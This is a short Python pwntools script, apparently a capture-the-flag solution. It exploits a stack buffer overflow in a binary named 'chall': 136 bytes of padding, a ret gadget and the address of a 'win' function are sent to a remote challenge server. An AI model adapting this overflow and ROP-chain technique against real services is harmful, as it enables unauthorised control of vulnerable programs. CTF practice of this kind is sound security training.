from pwn import *
elf = context.binary = ELF("./chall")
# r = process()
r = remote("178.128.29.224",9475)
offset = 136
ret = 0x000000000040101a
win = elf.sym['win']
rop = ROP(context.binary)
rop.raw(b"A" * offset)
rop.raw(ret)
rop.raw(win)
r.sendline(rop.chain())
print(r.recvall())